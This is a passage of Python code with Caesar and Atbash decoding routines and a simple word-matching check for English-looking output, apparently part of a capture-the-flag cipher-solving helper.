                base = ord('A') if ch.isupper() else ord('a')
                result += chr((ord(ch) - base - shift) % 26 + base)
            else:
                result += ch
        return result
    
    @staticmethod
    def _atbash_decode(text: str) -> str:
        result = ''
        for ch in text:
            if ch.isalpha():
                if ch.isupper():
                    result += chr(ord('Z') - (ord(ch) - ord('A')))
                else:
                    result += chr(ord('z') - (ord(ch) - ord('a')))
            else:
                result += ch
        return result
    
    @staticmethod
    def _looks_english(text: str) -> bool:
        if not text or len(text) < 3:
            return False
        common_words = ['the', 'and', 'for', 'are', 'but', 'not', 'you', 'all',
                       'flag', 'ctf', 'key', 'secret', 'password', 'admin',
                       'is', 'it', 'be', 'as', 'at', 'so', 'we', 'he', 'by']
        text_lower = text.lower()
        return any(word in text_lower for word in common_words)
